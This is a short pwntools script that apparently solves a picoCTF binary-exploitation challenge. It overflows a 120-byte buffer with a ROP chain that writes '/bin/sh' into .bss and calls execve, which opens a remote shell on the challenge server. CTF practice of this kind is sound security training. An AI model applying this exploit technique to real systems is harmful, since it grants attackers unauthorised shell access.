from pwn import *

context.arch = 'amd64'

elf = ELF( './vuln' )


bss = 0x006b7000

pop_rax = 0x00000000004163f4
pop_rdi = 0x0000000000400696
pop_rsi = 0x0000000000410ca3
pop_rdx = 0x000000000044a6b5
syscall = 0x000000000040137c
read = 0x0044a6a0

#rop = flat( [ pop_rdi,  ] )
rop = flat( [ pop_rdi, 0, pop_rsi, bss, pop_rdx, 8, read ] )
rop += flat( [ pop_rdi, bss, pop_rsi, 0, pop_rdx, 0, pop_rax, 0x3b, syscall ] )

payload = b'a' * 120 + rop

#for i in range( 100 ):
#	print( i )
#	p = elf.process()
#	#p = remote( 'jupiter.challenges.picoctf.org', 26735 )
#	p.recvuntil( '?\n' )
#	p.sendline( str(i) )
#	data = p.recvline()
#	p.close()
#	if data == b'Congrats! You win! Your prize is this print statement!\n':
#		break

#p = elf.process()
p = remote( 'jupiter.challenges.picoctf.org', 26735 )
p.recvuntil( '?\n' )
p.sendline( '84' )
p.recvuntil( '? ' )
raw_input()
p.sendline( payload )
p.send( b'/bin/sh\x00' )

p.interactive()


